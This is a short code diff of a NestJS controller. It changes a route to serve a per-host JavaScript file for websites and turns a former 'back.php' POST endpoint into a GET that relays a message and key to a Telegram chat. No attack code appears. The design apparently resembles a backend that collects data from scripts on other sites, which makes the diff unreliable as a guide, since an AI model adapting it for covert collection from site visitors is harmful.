@@ -12,6 +12,7 @@ import {
   UseGuards,
   Version,
 } from '@nestjs/common';
+import { Query } from '@nestjs/common/decorators';
 import {
   ApiBody,
   ApiHeader,
@@ -123,20 +124,21 @@ export class DomainsController {
   }
 
   @ApiOperation({ description: 'Скрипт для сайта' })
-  @Get('/test/scripts/script.js')
-  public getPageOrFile(
+  @Get('/:host/script')
+  public async getPageOrFile(
     @Req() req: e.Request,
     @Res({ passthrough: true }) res: e.Response,
   ) {
     res.header('Content-Type', 'text/javascript');
-    return ``;
+    const script = await this.domainsService.getHostScript(req.hostname);
+    return script;
   }
 
   @ApiOperation({ description: 'Операция для скрипта домена' })
-  @Post('/:domain/back.php')
+  @Get('/:domain/back')
   public logToTelegramChat(
     @Param('domain') host: string,
-    @Body() dto: LogToTelegramChatDto,
+    @Query() dto: LogToTelegramChatDto,
   ) {
     return this.domainsService.logToTelegramChat(host, dto.m, dto.key);
   }
